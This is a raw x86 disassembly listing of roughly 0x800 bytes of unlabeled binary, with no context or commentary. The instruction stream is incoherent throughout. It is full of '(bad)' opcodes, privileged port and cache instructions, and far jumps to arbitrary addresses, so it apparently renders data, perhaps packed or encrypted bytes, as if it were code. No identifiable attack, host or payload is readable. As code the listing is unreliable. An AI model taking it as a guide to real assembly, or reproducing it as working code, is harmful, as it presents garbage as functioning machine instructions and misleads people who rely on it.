  409bf4:	add    ecx,DWORD PTR [esp+eax*8+0x5c]
  409bf8:	xor    al,0x1f
  409bfa:	adc    BYTE PTR [edi+0x32],al
  409bfd:	je     0x409c02
  409bff:	mov    esp,0x5036364f
  409c04:	call   DWORD PTR [esi]
  409c06:	adc    DWORD PTR [eax-0x35],edi
  409c09:	in     eax,0x13
  409c0b:	mov    dl,0x98
  409c0d:	arpl   WORD PTR [eax],ax
  409c0f:	loopne 0x409c68
  409c11:	(bad)  
  409c12:	mov    dl,0xad
  409c14:	xchg   DWORD PTR [eax],ecx
  409c16:	pop    es
  409c17:	stos   BYTE PTR es:[edi],al
  409c18:	(bad)  
  409c19:	out    0x61,eax
  409c1b:	mov    cl,0x8e
  409c1d:	add    edi,ebp
  409c1f:	lahf   
  409c20:	dec    esp
  409c21:	and    DWORD PTR [ebp+0x47],edi
  409c24:	mov    ebp,0x31ec6327
  409c29:	and    cl,dh
  409c2b:	iret   
  409c2c:	and    dh,BYTE PTR [esi-0x1]
  409c2f:	js     0x409cac
  409c31:	pushf  
  409c32:	lahf   
  409c33:	pop    ebp
  409c34:	cli    
  409c35:	adc    DWORD PTR [edx+0x26],esp
  409c38:	inc    edx
  409c39:	ss mov eax,0xc98b2368
  409c3f:	pop    edi
  409c40:	mov    BYTE PTR ds:0x20c9e3eb,bl
  409c46:	(bad)
  409c49:	pop    ds
  409c4a:	adc    al,cl
  409c4c:	xlat   BYTE PTR ds:[ebx]
  409c4d:	aam    0x53
  409c4f:	imul   DWORD PTR [ecx-0x4578bc60]
  409c55:	pop    ecx
  409c56:	mov    ebx,0xa51910b3
  409c5b:	dec    eax
  409c5c:	xchg   DWORD PTR [ecx],edi
  409c5e:	jecxz  0x409ccc
  409c60:	fistp  QWORD PTR [ebx-0x4a3bda30]
  409c66:	fwait
  409c67:	imul   edx,DWORD PTR [edi],0x3e7997df
  409c6d:	mov    dl,0xca
  409c6f:	mov    esp,0x69e2a93a
  409c74:	lahf   
  409c75:	fs inc ebp
  409c77:	xlat   BYTE PTR ds:[ebx]
  409c78:	jbe    0x409c0d
  409c7a:	add    BYTE PTR [edx+0x290dc0ef],bl
  409c80:	mov    bh,0xa1
  409c82:	sub    cl,BYTE PTR [ebp+0x1]
  409c85:	xor    dl,BYTE PTR [esi]
  409c87:	xchg   ecx,eax
  409c88:	adc    ecx,DWORD PTR ds:0x1e8d35c6
  409c8e:	(bad)  
  409c8f:	cmp    DWORD PTR [edx+eiz*1-0x58],ecx
  409c93:	mov    ds:0x9bf3ac7b,eax
  409c98:	(bad)  
  409c99:	fstp   TBYTE PTR [ebp-0xd59fabd]
  409c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ca0:	xchg   edi,eax
  409ca1:	xchg   edi,eax
  409ca2:	pushf  
  409ca3:	push   es
  409ca4:	mov    dl,0x24
  409ca6:	jp     0x409ca2
  409ca8:	fadd   st,st(2)
  409caa:	cmp    eax,0xecbe7507
  409caf:	das    
  409cb0:	ret    0x3077
  409cb3:	cmp    al,0xd5
  409cb5:	in     al,0x82
  409cb7:	cmc    
  409cb8:	push   0x9ff2112a
  409cbd:	ja     0x409cb9
  409cbf:	imul   esi,DWORD PTR [esi-0x2f6fc6d3],0x49bada07
  409cc9:	clc    
  409cca:	rcr    BYTE PTR [ebp+ebp*8-0x6b2e7383],cl
  409cd1:	and    BYTE PTR [edi-0x45],cl
  409cd4:	test   al,0x17
  409cd6:	sti    
  409cd7:	inc    eax
  409cd8:	mov    dh,0xbb
  409cda:	int    0x76
  409cdc:	add    DWORD PTR [eax+ebx*4],0x2b
  409ce0:	xchg   edx,eax
  409ce1:	xchg   ebp,ecx
  409ce3:	add    BYTE PTR ds:0xfe1f4182,cl
  409ce9:	dec    ecx
  409cea:	mov    gs,WORD PTR [ecx]
  409cec:	lock lods al,BYTE PTR ds:[esi]
  409cee:	jns    0x409d56
  409cf0:	sbb    DWORD PTR [ecx],esp
  409cf2:	scas   al,BYTE PTR es:[edi]
  409cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cf4:	xchg   edx,eax
  409cf5:	mov    DWORD PTR [ebp-0x2716cd65],esi
  409cfb:	les    edx,FWORD PTR [ebx-0x4cebfcce]
  409d01:	pusha  
  409d02:	cli    
  409d03:	xor    BYTE PTR [ecx+ecx*4-0x3474c785],bl
  409d0a:	call   0x6edb1c7f
  409d0f:	retf   
  409d10:	push   cs
  409d11:	pop    ebx
  409d12:	sbb    bh,ah
  409d14:	mov    bh,0x63
  409d16:	xchg   ecx,eax
  409d17:	cmp    al,0x5d
  409d19:	xchg   BYTE PTR [ebx-0x34332edf],ah
  409d1f:	sbb    ch,BYTE PTR [edx+eiz*8+0x41751673]
  409d26:	rcr    ecx,0x16
  409d29:	xchg   esp,eax
  409d2a:	in     eax,dx
  409d2b:	mov    ebx,esp
  409d2d:	int    0x7a
  409d2f:	jae    0x409d73
  409d31:	mov    BYTE PTR [ebx+0x75],cl
  409d34:	hlt    
  409d35:	test   al,0x6c
  409d37:	sub    BYTE PTR [edx+0xe82cb65],dl
  409d3d:	adc    DWORD PTR [ecx-0x4b312a4],edx
  409d43:	cmp    BYTE PTR [edx-0xe1b0bb6],bl
  409d49:	stc    
  409d4a:	icebp  
  409d4b:	jge    0x409d9f
  409d4d:	scas   al,BYTE PTR es:[edi]
  409d4e:	push   esp
  409d4f:	ds scas al,BYTE PTR es:[edi]
  409d51:	fisubr WORD PTR [ebx+eax*8+0x6a]
  409d55:	lahf   
  409d56:	xchg   ebx,esp
  409d58:	aam    0xf7
  409d5a:	or     dh,BYTE PTR [ebp+0x70b5b7f8]
  409d60:	push   ss
  409d61:	shl    DWORD PTR [eax],cl
  409d63:	cli    
  409d64:	loop   0x409d04
  409d66:	xchg   edi,eax
  409d67:	and    esi,ebp
  409d69:	je     0x409d83
  409d6b:	sbb    DWORD PTR [ecx+esi*2],ebp
  409d6e:	and    al,0x73
  409d70:	xor    esi,DWORD PTR fs:[eax]
  409d73:	repz pushf 
  409d75:	pusha  
  409d76:	in     al,dx
  409d77:	push   ebp
  409d78:	(bad)  
  409d79:	mov    bl,0xe5
  409d7b:	call   0xccff:0xdf0effec
  409d82:	push   cs
  409d83:	mov    ebp,0xdeb1b17
  409d88:	sar    BYTE PTR [edx-0x13d84975],1
  409d8e:	js     0x409d8b
  409d90:	mov    al,ds:0x5bd24509
  409d95:	pop    edi
  409d96:	loopne 0x409df8
  409d98:	push   ss
  409d99:	push   ebx
  409d9a:	jecxz  0x409db6
  409d9c:	mov    al,ds:0x5b53b265
  409da1:	jl     0x409d39
  409da3:	out    dx,eax
  409da4:	int    0xf2
  409da6:	jns    0x409e04
  409da8:	ror    BYTE PTR [edx-0x272eaae4],1
  409dae:	call   0x2dadd373
  409db3:	cmp    al,0x66
  409db5:	call   0xf1cb:0xd7c42b7a
  409dbc:	sbb    esp,DWORD PTR [edi]
  409dbe:	push   edx
  409dbf:	push   ss
  409dc0:	sar    BYTE PTR [edi+eax*2+0x77492129],cl
  409dc7:	adc    cl,0x41
  409dca:	sar    DWORD PTR [edx-0x11],cl
  409dcd:	add    ebp,DWORD PTR [ebp-0x22]
  409dd0:	jmp    0x74d078c8
  409dd5:	call   0x508c3a8e
  409dda:	inc    edi
  409ddb:	xor    esp,esp
  409ddd:	cmc    
  409dde:	jbe    0x409da0
  409de0:	inc    edx
  409de1:	add    eax,0x1aa2a2b1
  409de6:	fwait
  409de7:	leave  
  409de8:	cli    
  409de9:	or     al,0x5c
  409dec:	dec    esi
  409ded:	cmp    eax,0x3dc6f72f
  409df2:	(bad)  
  409df3:	(bad)  
  409df4:	test   BYTE PTR [eax],0x16
  409df7:	mov    DWORD PTR [edi],ebx
  409df9:	sahf   
  409dfa:	inc    DWORD PTR [edx-0x45a9bd50]
  409e00:	mov    eax,0xc2613c01
  409e05:	mov    ch,0xd6
  409e07:	mov    ch,0xac
  409e09:	aaa    
  409e0a:	xor    BYTE PTR [esi+0x39],bl
  409e0d:	push   edx
  409e0e:	pop    esp
  409e0f:	jg     0x409d9e
  409e11:	add    ecx,DWORD PTR [ebp+0x4eb2b8c5]
  409e17:	mov    ecx,0x90222ba1
  409e1c:	int3   
  409e1d:	pushf  
  409e1e:	add    al,0x54
  409e20:	rcr    BYTE PTR [ebp+0x60],0x8c
  409e24:	pop    eax
  409e25:	in     al,dx
  409e26:	imul   esi,DWORD PTR [edx],0x157b954d
  409e2c:	xchg   ebp,eax
  409e2d:	sbb    edx,ebx
  409e2f:	int3   
  409e30:	stc    
  409e31:	cmp    al,0xe4
  409e34:	test   ebx,esi
  409e36:	xchg   edx,eax
  409e37:	call   0xe66a:0xec1ce63c
  409e3e:	cs xor al,0xff
  409e41:	(bad)  
  409e42:	and    esp,DWORD PTR [ebp+0xa4a1c9]
  409e48:	jbe    0x409e2d
  409e4a:	add    al,0x12
  409e4c:	iret   
  409e4d:	jp     0x409e4e
  409e4f:	loopne 0x409ec2
  409e51:	add    BYTE PTR [edx+esi*2+0x0],cl
  409e55:	push   ds
  409e56:	scas   al,BYTE PTR es:[edi]
  409e57:	sub    eax,0x62358e20
  409e5c:	dec    ecx
  409e5d:	(bad)
  409e61:	in     eax,dx
  409e62:	in     al,dx
  409e63:	fwait
  409e64:	sbb    BYTE PTR [edx+0x6c],dh
  409e67:	mov    BYTE PTR [eax],cl
  409e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e6a:	enter  0x96e0,0xf5
  409e6e:	sbb    BYTE PTR [eax-0x13],bl
  409e71:	push   0x31
  409e73:	das    
  409e74:	dec    eax
  409e75:	sahf   
  409e76:	inc    esp
  409e77:	jmp    0x4e4d:0xfb9e5c86
  409e7e:	les    ecx,FWORD PTR [edi+0x5f38872b]
  409e84:	cmc    
  409e85:	xlat   BYTE PTR ds:[ebx]
  409e86:	ss mov edx,0xd7a95267
  409e8c:	mov    eax,0x9d0439e8
  409e91:	sbb    DWORD PTR [ecx],esi
  409e93:	gs pop ecx
  409e95:	mov    ebx,0x470a6e3b
  409e9a:	les    edx,FWORD PTR [ebp-0x270dace0]
  409ea0:	mov    esp,0xe4963672
  409ea5:	xchg   DWORD PTR [ecx+0x49],edx
  409ea8:	cmp    al,0x4e
  409eaa:	sub    al,0x0
  409eac:	and    eax,0xfbd8b5b1
  409eb1:	retf   0xbd5a
  409eb4:	pop    ss
  409eb5:	imul   BYTE PTR [eax+0x4fa081b3]
  409ebb:	fwait
  409ebc:	mov    dh,0x58
  409ebe:	mov    DWORD PTR [ebx+0x18b6a2ad],ecx
  409ec4:	fwait
  409ec5:	mov    cl,BYTE PTR ds:[eax-0x5571f074]
  409ecc:	inc    esp
  409ecd:	cmp    eax,0x67d8cc22
  409ed2:	and    edx,DWORD PTR [ebx+0x64]
  409ed5:	retf   
  409ed6:	push   0x35
  409ed8:	xor    ch,BYTE PTR [edx-0x2f3f9acb]
  409ede:	push   0xf14d8c86
  409ee3:	(bad)  
  409ee4:	imul   ecx,edx,0x5f
  409ee7:	rcl    ah,0xf6
  409eea:	sub    ch,bl
  409eec:	nop
  409eed:	jae    0x409e9c
  409eef:	shr    dh,0x36
  409ef2:	aaa    
  409ef3:	test   ah,0xf7
  409ef6:	fs jecxz 0x409eb6
  409ef9:	inc    eax
  409efa:	pop    eax
  409efb:	ret    0x7dfb
  409efe:	je     0x409ebe
  409f00:	stos   BYTE PTR es:[edi],al
  409f01:	mov    esi,0x3dc3ca89
  409f06:	xchg   esp,eax
  409f07:	data16 loope 0x409ee1
  409f0a:	(bad)
  409f0e:	mov    edi,0x352e1ad7
  409f13:	sub    al,0xf8
  409f15:	xchg   edx,eax
  409f16:	pop    es
  409f17:	pop    eax
  409f18:	fistp  WORD PTR [edx-0x1fe206b8]
  409f1e:	mov    eax,0x4c5119b9
  409f23:	arpl   WORD PTR [ebp-0x3c2367d2],ax
  409f29:	loopne 0x409f71
  409f2b:	add    edx,eax
  409f2d:	fidiv  WORD PTR ds:0x971222ff
  409f33:	jo     0x409f22
  409f35:	nop
  409f36:	iret   
  409f37:	pop    edi
  409f38:	jne    0x409f92
  409f3a:	adc    eax,0xfa8d345f
  409f3f:	leave  
  409f40:	jg     0x409f54
  409f42:	push   ebp
  409f43:	dec    edi
  409f44:	pop    edx
  409f45:	repz test DWORD PTR [ebx+edx*1+0x26],ecx
  409f4a:	les    esi,FWORD PTR [edi+0xb052386]
  409f50:	fsub   st(3),st
  409f52:	xlat   BYTE PTR ds:[ebx]
  409f53:	xchg   edx,eax
  409f54:	ret    
  409f55:	push   0x2f
  409f57:	xchg   ebx,eax
  409f58:	repnz dec ebx
  409f5a:	jge    0x409f7b
  409f5c:	addr16 (bad) 
  409f5e:	repz and DWORD PTR [eax],ebp
  409f61:	xor    eax,0xc62480a2
  409f66:	pop    edx
  409f67:	inc    edi
  409f68:	xor    al,BYTE PTR [edx+0x7625b5d9]
  409f6e:	push   esp
  409f6f:	fisubr DWORD PTR ss:[ebp-0xc]
  409f73:	sub    BYTE PTR [ebx],0xa1
  409f76:	outs   dx,DWORD PTR ds:[esi]
  409f77:	icebp  
  409f78:	leave  
  409f79:	xchg   ebx,eax
  409f7a:	not    DWORD PTR [edi-0x76388552]
  409f80:	jmp    0x9436:0x64c344e6
  409f87:	push   ss
  409f88:	das    
  409f89:	inc    eax
  409f8a:	push   edx
  409f8b:	out    0x87,eax
  409f8d:	mov    ebp,eax
  409f8f:	nop
  409f90:	imul   ecx,DWORD PTR [ecx+0x65],0xffffffa1
  409f94:	mov    bl,0xf2
  409f96:	adc    al,0x1f
  409f98:	xor    eax,0xa0a1b785
  409f9d:	cmp    eax,0xa7761733
  409fa2:	mov    ds:0xed1b12fd,al
  409fa7:	dec    esp
  409fa8:	stc    
  409fa9:	push   eax
  409faa:	jbe    0x409f9f
  409fac:	mov    gs,WORD PTR ds:0x1f0940a3
  409fb2:	stos   BYTE PTR es:[edi],al
  409fb3:	mov    ah,0x1c
  409fb5:	lea    edi,[eax+ebx*2-0x5615fbae]
  409fbc:	sbb    DWORD PTR [edx],0x3591d414
  409fc2:	mov    ebx,0xa90bed14
  409fc7:	xor    ch,BYTE PTR [eax+ebx*1]
  409fca:	mov    al,ds:0x6979ca5a
  409fcf:	lahf   
  409fd0:	xchg   ebx,eax
  409fd1:	or     bl,0x9a
  409fd4:	bnd jne 0x409f59
  409fd7:	or     DWORD PTR [edx-0x26fa1da0],edi
  409fdd:	pusha  
  409fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fdf:	lahf   
  409fe0:	int3   
  409fe1:	nop
  409fe2:	mov    ebx,0xeeaa11d
  409fe7:	das    
  409fe8:	(bad)  
  409fe9:	jge    0x409fe5
  409feb:	inc    ebp
  409fec:	fsubr  QWORD PTR [ebx+0x73]
  409fef:	sub    BYTE PTR [eax],0xec
  409ff2:	dec    esp
  409ff3:	xchg   edx,eax
  409ff4:	aad    0x1c
  409ff6:	in     eax,0xc0
  409ff8:	fsub   QWORD PTR [edx]
  409ffa:	fiadd  DWORD PTR [edx+0x1f]
  409ffd:	adc    eax,DWORD PTR cs:[ebx-0x7e97b4cf]
  40a004:	jge    0x40a04d
  40a006:	scas   al,BYTE PTR es:[edi]
  40a007:	lods   al,BYTE PTR ds:[esi]
  40a008:	fstp   QWORD PTR [esi-0x1c]
  40a00b:	retf   0x2714
  40a00e:	repz mov ch,0x4
  40a011:	cmp    edi,DWORD PTR [ebx+ebp*1+0x2]
  40a015:	fs gs inc ch
  40a019:	(bad)  
  40a01a:	nop
  40a01b:	imul   ecx,edx,0x13
  40a01e:	mov    edx,0x16968293
  40a023:	icebp  
  40a024:	fld    QWORD PTR ds:0xc8147962
  40a02a:	jecxz  0x40a021
  40a02c:	in     al,0xe2
  40a02e:	jnp    0x409fdd
  40a030:	lods   al,BYTE PTR ds:[esi]
  40a031:	lds    edx,FWORD PTR [edx+ecx*2+0x12b1e07f]
  40a038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a039:	shr    BYTE PTR [edi],0xd5
  40a03c:	xor    bh,BYTE PTR [edx-0x3]
  40a03f:	xchg   ebp,eax
  40a040:	das    
  40a041:	ins    BYTE PTR es:[edi],dx
  40a042:	sub    al,0xa
  40a044:	add    bh,BYTE PTR [ebp+0x4c]
  40a047:	pop    ecx
  40a048:	add    al,BYTE PTR [ecx]
  40a04a:	inc    ecx
  40a04b:	(bad)  
  40a04c:	jb     0x409ffc
  40a04e:	pushf  
  40a04f:	repz mov esp,0x6a6e8f1b
  40a055:	and    ebp,ebp
  40a057:	xchg   esp,eax
  40a058:	call   0xf1dd:0xf3a4877d
  40a05f:	fdivr  QWORD PTR [edi]
  40a061:	mov    fs,WORD PTR ds:0x8d3102ad
  40a067:	mov    eax,ds:0xc0a49d3e
  40a06c:	outs   dx,BYTE PTR ds:[esi]
  40a06d:	ret    
  40a06e:	push   0x76
  40a070:	(bad)  
  40a071:	dec    ebp
  40a072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a073:	stos   DWORD PTR es:[edi],eax
  40a074:	xor    bh,cl
  40a076:	sbb    DWORD PTR ds:0x21056b0,eax
  40a07c:	retf   
  40a07d:	jae    0x40a00e
  40a07f:	push   eax
  40a080:	mov    al,ds:0xb51c5174
  40a085:	and    al,0xe3
  40a087:	shl    DWORD PTR [ebp-0x3f96683a],1
  40a08d:	add    eax,0x27bdfd6d
  40a092:	retfw  0x914d
  40a096:	sbb    eax,0x3c76a521
  40a09b:	add    cl,cl
  40a09d:	adc    dh,BYTE PTR ds:0x1d49e1c9
  40a0a3:	add    al,0x87
  40a0a5:	adc    eax,0xb9623a06
  40a0aa:	cdq    
  40a0ab:	mov    ebp,0xabb024b3
  40a0b0:	dec    ebx
  40a0b1:	out    dx,eax
  40a0b2:	inc    edx
  40a0b3:	wbinvd 
  40a0b5:	repnz out dx,eax
  40a0b7:	call   FWORD PTR [ebx-0x1943acb1]
  40a0bd:	(bad)  
  40a0be:	pop    ebx
  40a0bf:	xor    edi,ebp
  40a0c1:	sbb    al,0x15
  40a0c3:	push   eax
  40a0c4:	pop    edi
  40a0c5:	mov    edi,0x97fdd04d
  40a0ca:	imul   ecx,eax,0xbee8d876
  40a0d0:	cdq    
  40a0d1:	imul   ebx,DWORD PTR [edi],0xffffffa1
  40a0d4:	ja     0x40a13d
  40a0d6:	push   ecx
  40a0d7:	and    BYTE PTR [eax],bl
  40a0d9:	jecxz  0x40a0e0
  40a0db:	loop   0x40a0b6
  40a0dd:	inc    ebp
  40a0de:	imul   BYTE PTR [ebx]
  40a0e0:	cwde   
  40a0e1:	rol    BYTE PTR [eax],cl
  40a0e3:	pushf  
  40a0e4:	imul   esi,DWORD PTR [ecx-0x4],0xffffffef
  40a0e8:	inc    ebp
  40a0e9:	jge    0x40a09f
  40a0eb:	js     0x40a093
  40a0ed:	imul   edi,DWORD PTR [edi-0x74ae9880],0xffffff89
  40a0f4:	push   edi
  40a0f5:	add    BYTE PTR [ebx-0x127ac656],bl
  40a0fb:	and    al,0xd4
  40a0fd:	mov    esi,eax
  40a0ff:	xor    bl,BYTE PTR [ecx+0x2d]
  40a102:	mov    bl,0x32
  40a104:	cli    
  40a105:	jb     0x40a0c7
  40a107:	je     0x40a12b
  40a109:	mov    DWORD PTR [edi-0xb749e08],ebp
  40a10f:	or     eax,0x60af21c8
  40a114:	mov    eax,ebx
  40a116:	retf   0xeafe
  40a119:	xchg   edx,eax
  40a11a:	mov    ecx,0xa01a7d19
  40a11f:	sbb    dl,cl
  40a121:	lods   al,BYTE PTR ds:[esi]
  40a122:	mov    edx,0xd9db191b
  40a127:	ss popf 
  40a129:	test   BYTE PTR [ebx],al
  40a12b:	mov    ah,0xbd
  40a12d:	nop
  40a12e:	test   DWORD PTR [ebp+0x13],0x47925cee
  40a135:	ficom  DWORD PTR [esi-0x6]
  40a138:	xchg   ebx,eax
  40a139:	push   ss
  40a13a:	or     al,0xf1
  40a13c:	fistp  DWORD PTR [edx-0x41]
  40a13f:	sub    BYTE PTR [edx],cl
  40a141:	xor    al,0x15
  40a143:	mov    eax,ds:0x414af39f
  40a148:	dec    edx
  40a149:	bound  dx,DWORD PTR ds:0xdb4f3f7e
  40a150:	ficomp WORD PTR [edi]
  40a152:	pop    esi
  40a153:	pop    ds
  40a154:	cmp    eax,0x9509a4c0
  40a159:	iret   
  40a15a:	and    edx,DWORD PTR [ebx+0x74]
  40a15d:	sahf   
  40a15e:	push   edi
  40a15f:	jl     0x40a17d
  40a161:	fwait
  40a162:	mov    bh,BYTE PTR [eax-0x41]
  40a165:	enter  0x152f,0xc6
  40a169:	xor    BYTE PTR [eax+0x69],al
  40a16c:	pop    ebp
  40a16d:	sub    ah,BYTE PTR [edi+0x1a722a05]
  40a173:	or     BYTE PTR [ebx+0x3a5b09bc],bh
  40a179:	xor    DWORD PTR [ebp+eiz*4-0x6787d9fa],esi
  40a180:	xor    al,0x7d
  40a182:	jmp    0x40a1d1
  40a184:	ret    0x9852
  40a187:	(bad)  
  40a188:	and    esp,esp
  40a18a:	sub    ebp,edx
  40a18c:	stc    
  40a18d:	call   0x2e8e:0x1b767414
  40a194:	inc    ebx
  40a195:	sahf   
  40a196:	mov    al,ds:0x78dc277b
  40a19b:	out    dx,al
  40a19c:	pop    edx
  40a19d:	shl    ebp,0xf6
  40a1a0:	push   eax
  40a1a1:	into   
  40a1a2:	cmp    bl,al
  40a1a4:	stos   BYTE PTR es:[edi],al
  40a1a5:	shr    BYTE PTR [edx+0x2d],0xc4
  40a1a9:	and    al,0x87
  40a1ab:	mov    bh,BYTE PTR [edx+0x64]
  40a1ae:	push   esp
  40a1af:	or     dh,al
  40a1b1:	sub    eax,0xf5f6f228
  40a1b6:	sub    dh,bh
  40a1b8:	int    0x56
  40a1ba:	sub    BYTE PTR [ecx+0x4d285b45],cl
  40a1c0:	mov    edi,0x1c97958b
  40a1c5:	popf   
  40a1c6:	sbb    edi,DWORD PTR [eax]
  40a1c8:	ret    0x953f
  40a1cb:	jge    0x40a231
  40a1cd:	mov    ah,0xcb
  40a1cf:	pop    ecx
  40a1d0:	rcr    ebx,1
  40a1d2:	jmp    DWORD PTR gs:0x3b3cbe8e
  40a1d9:	rcr    ah,cl
  40a1db:	jmp    0x75e:0x681e0645
  40a1e2:	cmp    ebx,DWORD PTR [esi]
  40a1e4:	cmp    eax,DWORD PTR [ebx+0x4175b6e0]
  40a1ea:	add    ebx,DWORD PTR [esi]
  40a1ec:	add    dl,BYTE PTR [ebx-0x4a]
  40a1ef:	sbb    al,0xc9
  40a1f1:	mov    BYTE PTR [edx-0x56a93cce],bh
  40a1f7:	dec    ebp
  40a1f8:	pop    ebx
  40a1f9:	push   cs
  40a1fa:	jne    0x40a238
  40a1fc:	jae    0x40a245
  40a1fe:	jbe    0x40a220
  40a200:	dec    esp
  40a201:	es and eax,0xb608191
  40a207:	jbe    0x40a240
  40a209:	mov    esp,0x27fe4699
  40a20e:	pop    es
  40a20f:	stos   BYTE PTR es:[edi],al
  40a210:	ds ret 0x8a52
  40a214:	or     DWORD PTR [ecx+esi*4],esi
  40a217:	adc    eax,0xd06d8782
  40a21c:	mov    es,WORD PTR [eax-0x7bf6015b]
  40a222:	jo     0x40a241
  40a224:	pop    eax
  40a225:	fwait
  40a226:	sti    
  40a227:	xchg   ecx,eax
  40a228:	add    DWORD PTR [ebx],esi
  40a22a:	pop    ebx
  40a22b:	shl    BYTE PTR [edx+0x7c],1
  40a22e:	push   DWORD PTR [eax+0x41]
  40a231:	mov    ds:0xe9d9a8a4,eax
  40a236:	test   eax,0x9ca26cb7
  40a23b:	mov    esp,0x89440f11
  40a240:	sbb    DWORD PTR [edi],esp
  40a242:	sbb    DWORD PTR [edx+0x4],edx
  40a245:	les    eax,FWORD PTR [ebx+0x58]
  40a248:	in     al,0xc8
  40a24a:	icebp  
  40a24b:	xor    esi,eax
  40a24d:	jle    0x40a1df
  40a24f:	xchg   ebp,eax
  40a250:	push   0x1d
  40a252:	mov    ds:0x3aeb83c7,al
  40a257:	xchg   BYTE PTR [ecx+0x3456142a],cl
  40a25d:	jne    0x40a2a9
  40a25f:	sub    esi,ebp
  40a261:	std    
  40a262:	(bad)  [edx+0x51e1dd7a]
  40a268:	(bad)  
  40a269:	xchg   esp,eax
  40a26a:	sbb    ebx,DWORD PTR [ebp-0x3b]
  40a26d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a26e:	inc    ecx
  40a26f:	dec    ebx
  40a270:	dec    edx
  40a271:	stc    
  40a272:	repz jge 0x40a24a
  40a275:	sbb    DWORD PTR [edx+0x5f09f8b6],esp
  40a27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a27c:	adc    DWORD PTR [ebp-0x1b],ebx
  40a27f:	(bad)  
  40a280:	dec    esp
  40a281:	inc    eax
  40a282:	adc    DWORD PTR [esi],edx
  40a284:	xor    esi,DWORD PTR [edx+0x528c3fa6]
  40a28a:	icebp  
  40a28b:	popf   
  40a28c:	test   al,0x61
  40a28e:	xchg   ebp,eax
  40a28f:	call   0x93eb7959
  40a294:	sub    BYTE PTR [ebx-0x14],0xbf
  40a298:	cmp    ebp,DWORD PTR [edx-0x32]
  40a29b:	xchg   edx,eax
  40a29c:	test   esp,ebx
  40a29e:	inc    edi
  40a29f:	lods   eax,DWORD PTR ds:[esi]
  40a2a0:	xchg   BYTE PTR [esi],dl
  40a2a2:	dec    edx
  40a2a3:	(bad)  
  40a2a4:	repz out dx,eax
  40a2a6:	inc    eax
  40a2a7:	stos   DWORD PTR es:[edi],eax
  40a2a8:	stos   BYTE PTR es:[edi],al
  40a2a9:	int3   
  40a2aa:	mov    WORD PTR [eax+0x153e9f2c],?
  40a2b0:	xchg   DWORD PTR [ecx-0x4e16f9c5],esi
  40a2b6:	mov    esi,0xace9594
  40a2bb:	cwde   
  40a2bc:	hlt    
  40a2bd:	sub    BYTE PTR [ebx-0x66b680bb],bl
  40a2c3:	xchg   DWORD PTR [ecx-0x2b6beec6],edi
  40a2c9:	jle    0x40a2f4
  40a2cb:	add    al,0x5
  40a2cd:	push   esi
  40a2ce:	pushf  
  40a2cf:	push   esp
  40a2d0:	mov    bl,al
  40a2d2:	sub    BYTE PTR [esi+edi*8-0x8],0x7e
  40a2d7:	pusha  
  40a2d8:	adc    dl,dl
  40a2da:	xchg   ebp,eax
  40a2db:	adc    eax,0x4d6c6b83
  40a2e0:	push   ecx
  40a2e1:	cmp    eax,0x80391030
  40a2e6:	fistp  DWORD PTR [edx]
  40a2e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2e9:	enter  0x77a2,0x4d
  40a2ed:	add    ecx,DWORD PTR [esi]
  40a2ef:	out    dx,al
  40a2f0:	mov    ds:0xc553ed6b,al
  40a2f5:	daa    
  40a2f6:	pop    edx
  40a2f7:	jo     0x40a2f9
  40a2f9:	mov    ebx,0x44b3df88
  40a2fe:	clc    
  40a2ff:	pop    esp
  40a300:	clc    
  40a301:	jecxz  0x40a285
  40a303:	or     BYTE PTR [edi-0x3],0xdd
  40a307:	xchg   BYTE PTR [ebp+0x172ad2e6],bl
  40a30d:	outs   dx,DWORD PTR ds:[esi]
  40a30e:	cmp    BYTE PTR ds:0x68a74c42,ch
  40a314:	ret    0x8b6f
  40a317:	jmp    0xb3bf:0xe66114a2
  40a31e:	push   eax
  40a31f:	push   esp
  40a320:	and    al,0xa
  40a322:	mov    ebp,eax
  40a324:	mov    ecx,0x9ec48595
  40a329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a32a:	loopne 0x40a34b
  40a32c:	and    al,0xdd
  40a32e:	out    dx,al
  40a32f:	outs   dx,DWORD PTR ds:[esi]
  40a330:	push   ebp
  40a331:	fcom   st(2)
  40a333:	cwde   
  40a334:	inc    edi
  40a335:	rcr    DWORD PTR [ecx-0x49],0xee
  40a339:	in     eax,0xda
  40a33b:	pop    ecx
  40a33c:	and    DWORD PTR ds:0x1ec6eeda,ecx
  40a342:	sub    ch,BYTE PTR [esi-0x5fa10336]
  40a348:	or     BYTE PTR [edx-0x5a],bh
  40a34b:	out    dx,al
  40a34c:	cmp    DWORD PTR ds:0xce5ffe11,0xffffff8b
  40a353:	cs (bad) 
  40a356:	adc    al,BYTE PTR [ecx]
  40a358:	jg     0x40a391
  40a35a:	mov    BYTE PTR [edi],dl
  40a35c:	(bad)  
  40a35d:	xlat   BYTE PTR ds:[ebx]
  40a35e:	adc    esp,esp
  40a360:	iret   
  40a361:	pop    ecx
  40a362:	pop    esp
  40a363:	jns    0x40a342
  40a365:	ja     0x40a350
  40a367:	dec    edx
  40a368:	enter  0x6230,0xef
  40a36c:	lds    ebx,FWORD PTR [ebp+0x57380566]
  40a372:	lods   eax,DWORD PTR ds:[esi]
  40a373:	int3   
  40a374:	sbb    bl,BYTE PTR [eax-0x55]
  40a377:	movlps QWORD PTR ds:0x913a8fa6,xmm5
  40a37e:	(bad)  
  40a37f:	mov    al,0x99
  40a381:	push   ebx
  40a382:	xor    BYTE PTR [eax-0x7fba382e],dh
  40a388:	xor    eax,edi
  40a38a:	call   0x55c2:0xd4b1f5c0
  40a391:	test   al,0xa
  40a393:	jo     0x40a32e
  40a395:	xchg   ebx,eax
  40a396:	pop    esi
  40a397:	dec    esi
  40a398:	xor    DWORD PTR [ebp+edi*4-0x5e05cf2a],esp
  40a39f:	or     BYTE PTR [eax+eiz*8],ah
  40a3a2:	stos   DWORD PTR es:[edi],eax
  40a3a3:	dec    esi
  40a3a4:	jbe    0x40a348
  40a3a6:	ret    
  40a3a7:	cmc    
  40a3a8:	jle    0x40a422
  40a3aa:	mov    eax,ds:0xf44b3707
  40a3af:	aas    
